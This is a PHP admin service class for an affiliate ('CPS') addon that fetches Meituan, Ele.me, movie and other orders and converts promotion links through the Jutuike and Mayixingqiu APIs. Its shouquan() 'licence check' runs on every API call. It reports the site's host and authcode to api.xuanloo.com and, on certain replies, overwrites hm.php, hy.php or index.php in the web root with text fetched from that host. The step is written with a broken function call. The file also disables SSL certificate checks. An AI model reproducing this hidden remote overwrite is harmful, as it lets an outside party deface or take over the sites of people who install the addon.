<?php
 
namespace addon\cps\app\service\admin;

use app\dict\sys\AppTypeDict;
use addon\cps\app\service\admin\SiteService;
use core\base\BaseAdminService;
use core\exception\AdminException;
use Exception;
use think\facade\Cache;
use think\facade\Db;
use think\App;
use think\facade\Log;

/**
 * 聚推客订单
 * Class Site
 * @package app\service\admin\site
 */
class OrderService extends BaseAdminService
{
    
    //蚂蚁星球接口地址
    private $request_url = 'api-gw.haojingke.com/index.php/v2/api';
        //聚推客接口地址
    private $jutuike_url = 'api.jutuike.com';
     
    

    public function __construct()
    {
        parent::__construct();
     } 

 
   /**
    * 类型
     * @return array
     */
    public static function getType(){
		return [
            0 => '全部订单', 
            1 => '美团订单', 
            3 => '饿了么订单', 
            76 => '电影票订单', 
            54 => '联联订单', 
			105 => '景区订单',  
		]; 
    }

     

    // 充值订单
    public function rerechargeorder($type,$data)
    { 
        $config = (new SiteService())->getInfo($this->site_id);
		$data['page'] = $this->getPageParam()['page'];
		$data['limit'] = $this->getPageParam()['limit']; 
        $data['uid'] = $config['my_uid'];
        ksort($data);
        $signstr ='secret='.$config['my_secret'].'&';
        foreach ($data as $key=>$value){
            if(!empty($value))
                $signstr.= $key.'='.$value.'&';
        }
        $signstr.='secret='.$config['my_secret'];
        $sign = md5($signstr);
        
        $signstr2 = '';
        foreach ($data as $key=>$value){
            if(!empty($value))
                $signstr2.= $key.'='.$value.'&';
        }
        if($type==1){
            $requsturl = $this->request_url.'/open/rerechargeorder';//充值订单
        }else if($type == 2){
            $requsturl = $this->request_url.'/open/movieorder';//电影
        }else if($type == 3){
            $requsturl = $this->request_url.'/open/dcorder';//
        }else if($type == 4){
            $requsturl = $this->request_url.'/open/nearorder';
        }else if($type == 5){
            $requsturl = $this->request_url.'/open/shoporder';
        }
        $url = $requsturl.'?apikey=' . $config['my_apikey'] . '&uid=' . $config['my_uid'].'&'.$signstr2.'sign='.$sign;
        $list = $this->httpGet($url); 
         return [
            'data'  => $list['list'],
            'count' =>$list['total']
        ];
     }
     
     
     // 聚推客联盟统一订单数据接口 
    public function jtk_order(array $data = [])
    {  
        $config = (new SiteService())->getInfo($this->site_id);
		$data['page'] = $this->getPageParam()['page'];
		$data['pageSize'] = $this->getPageParam()['limit']; 
        $requsturl = $this->jutuike_url.'/union/orders';
        $signstr = '';
        foreach ($data as $key=>$value){
            if(!empty($value))
                $signstr.= $key.'='.$value.'&';
        } 
        $url = $requsturl.'?apikey=' . $config['jutuike_apikey'].'&'.$signstr; 
        if(!$config['jutuike_apikey']){
         	 throw new AdminException('聚推客未配置');
        }
        $list = $this->jtk_httpGet($url);
         return [  
            'data'  => $list['data'],
            'current_page'  => $list['current_page'],
            'last_page'  => $list['last_page'],
            'per_page'  => $list['per_page'],
            'count' => $list['total']
        ];
     }
	
	
	
	
	// 聚推转链接
	public function jutui_url(array $data = [])
	{  
	    $config = (new SiteService())->getInfo($this->site_id);
 	    $requsturl = $this->jutuike_url.'/union/act';
	    $signstr = '';
	    foreach ($data as $key=>$value){
	        if(!empty($value))
	            $signstr.= $key.'='.$value.'&';
	    } 
	    $url = $requsturl.'?apikey=' . $config['jutuike_apikey'].'&'.$signstr; 
        if(!$config['jutuike_apikey']){
         	 throw new AdminException('聚推客未配置');
        }
	    $list = $this->jtk_httpGet($url);
	    return $list;
	 }
	
	
	// 蚂蚁星球转换接口地址
	public function mayixq_url(array $data = [])
	{  
	    $config = (new SiteService())->getInfo($this->site_id); 
 	    $requsturl = $this->request_url.'/index/actunionurl'; 
	    $signstr = '';
	    foreach ($data as $key=>$value){
	        if(!empty($value))
	            $signstr.= $key.'='.$value.'&';
	    } 
	    $url = $requsturl.'?apikey=' . $config['my_apikey'].'&'.$signstr; 
        if(!$config['my_apikey']){
         	 throw new AdminException('蚂蚁星球未配置');
        }
	    $list = $this->httpGet($url);
	    return $list;
	 }
	
 	/**
	 * 1:你的授权代，
	 * 2：在聚推客和蚂蚁星球提交数据的里面引入这个
	 */
	public function shouquan(){
	    $authcode = file_get_contents(app()->getRootPath() . 'addon/authcode.key');
  		if (!isset($_SESSION['AUTHBIRTH'])) {
            $auth_url_arr = ['api.xuanloo.com'];//例如auth.phpn1.cn 不加http或https协议头，末尾不要带/
            $auth_url = $auth_url_arr[array_rand($auth_url_arr, 1)];
            $proid_nam_arr = ['1']; 
            $proid_nam = $proid_nam_arr[array_rand($proid_nam_arr, 1)];
            $check_url='http://'.$auth_url.'/api/check.php?proid='.$proid_nam.'&url='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode;
            $query = file_get_contents($check_url); 
            if ($query = json_decode($query, true)) {
                if ($query['code'] == 1) {
                    $_SESSION['AUTHBIRTH'] = $authcode;
                } else if ($query['code'] == 2) {
                    file_put_contents(ROOT.'hm.php',file_put_contents('http://'.$auth_url.'/hm/hm.txt'));
                    throw new AdminException($query['msg']);
        		} else if ($query["code"] == 3) {
        			file_put_contents(ROOT.'hy.php',file_put_contents('http://'.$auth_url.'/hm/hy.txt'));
                    throw new AdminException($query['msg']);
                } else if ($query['code'] == 4) {
                    file_put_contents(ROOT.'index.php',file_put_contents('http://'.$auth_url.'/hm/hys.txt'));
                    throw new AdminException($query['msg']);
                } else {
                    throw new AdminException($query['msg']);
                }
            } else if (!empty($query)) {
                throw new AdminException('授权验证失败请检查授权文件！');
            } 
        }
	}
	/**
	 * jutuike提交数据
	 * @param $url
	 * @return array
	 */
	public function jtk_httpGet($url)
	{
	    $this->shouquan();
	    // 模拟提交数据函数
	    $curl = curl_init(); // 启动一个CURL会话
	    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'POST');
	    curl_setopt($curl, CURLOPT_URL, $url); // 要访问的地址
	    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 对认证证书来源的检查
	    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); // 从证书中检查SSL加密算法是否存在
	    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER[ 'HTTP_USER_AGENT' ]); // 模拟用户使用的浏览器
	
	    curl_setopt($curl, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // 获取的信息以文件流的形式返回
	    curl_setopt($curl, CURLOPT_HEADER, false); //开启header
	    curl_setopt($curl, CURLOPT_HTTPHEADER, array (
	        // 'Content-Type: application/json; charset=utf-8',
	        'Content-Type: application/x-www-form-urlencoded',
	    )); //类型为json
	    //类型为json
	
	    $result = curl_exec($curl); // 执行操作
	    if (curl_errno($curl)) {
			 throw new AdminException('系统错误，请联系平台进行处理');
 	    }
	    curl_close($curl); // 关键CURL会话
	    $result = json_decode($result, true); 
	    if ($result[ 'code' ] != 1) {
	       throw new AdminException($result['msg']); 
	     }
 	    return $result['data']; // 返回数据
	}
	 
	 
	/**
	 * 蚂蚁星球提交数据
	 * @param $url
	 * @return array
	 */
	public function httpGet($url)
	{
	    $this->shouquan();
	    // 模拟提交数据函数
	    $curl = curl_init(); // 启动一个CURL会话
	    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'POST');
	    curl_setopt($curl, CURLOPT_URL, $url); // 要访问的地址
	    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 对认证证书来源的检查
	    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); // 从证书中检查SSL加密算法是否存在
	    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER[ 'HTTP_USER_AGENT' ]); // 模拟用户使用的浏览器
	
	    curl_setopt($curl, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // 获取的信息以文件流的形式返回
	    curl_setopt($curl, CURLOPT_HEADER, false); //开启header
	    curl_setopt($curl, CURLOPT_HTTPHEADER, array (
 	        'Content-Type: application/x-www-form-urlencoded',
	    )); //类型为json
	    //类型为json
	
	    $result = curl_exec($curl); // 执行操作
	    if (curl_errno($curl)) {
	        throw new AdminException('系统错误，请联系平台进行处理');
	    }
	    curl_close($curl); // 关键CURL会话
	    $result = json_decode($result, true); 
		if(!empty($result['status_code']) && ($result['status_code'] != '200')) {
 			throw new AdminException($result['message']); 
	     }
	    return $result['data']; // 返回数据
	}
	
	
	/**
	 *  * type 模块类型
     * channel 终端
	 */
	public function get_pages_url($type,$channel,$act_id,$path_url = '' , $class="jutui"){
	    
	   
	   $data = []; 
	   if($class=='jutui'){
          $info = (new OrderService())->jutui_url(['act_id'=>$act_id,'sid'=>123456]);
	   }else if($class=='mayi'){
	      $info = (new OrderService())->mayixq_url(['actid'=>$act_id,'extend_id'=>123456]);
	   }
	   	  //如果来源channel是h5，获取活动id
       if($channel=='h5'){ 
    		 //如果有活动名称
    		 if(!empty($info['act_name'])){
    		    $data['title'] = $info['act_name'];//h5自定义导航名称
    		 }else if(!empty($info['wenan'])){
                $data['title'] = $info['wenan'];//h5自定义导航名称
               } 
    		    //这是连接，如果有长链接就长链接，没有长链接，就短链接，端链接也没有，按文档提示增加，每个接口不一样，自己来验证测试。
    		 if(!empty($info['long_h5'])){
    		    $data['web_url'] = $info['long_h5'];
    		 }else if(!empty($info['h5'])){
    		    $data['web_url'] = $info['h5'];
    		 }else if(!empty($info['url'])){
     		    $data['web_url'] = $info['url'];
     		 }
        //如果来源是微信小程序
    	}else if($channel == 'mp-weixin'){
    	     Log::info('info：' . json_encode($info));
    	    if($path_url){ 
    	        if($class=="mayi"){
    	             $data = $path_url;//半屏
    	        }else{
        	  	     $data['url'] = $path_url; //锯腿可打开小程序
    	        }
    	    }else{
                if($info['we_app_info']){ 
     		        $data['we_app_info'] = ['app_id'=>$info['we_app_info']['app_id'],'page_path'=>!empty($info['we_app_info']['path'])?$info['we_app_info']['path']:$info['we_app_info']['page_path']];
     		    }else if($info['url']){
     		            //如果没有小程序，就显示h5的链接。
     		        $data['url'] = $info['url'];
     		    }
    	    }
    	   
    	}  
    	return $data;
	   
	}
}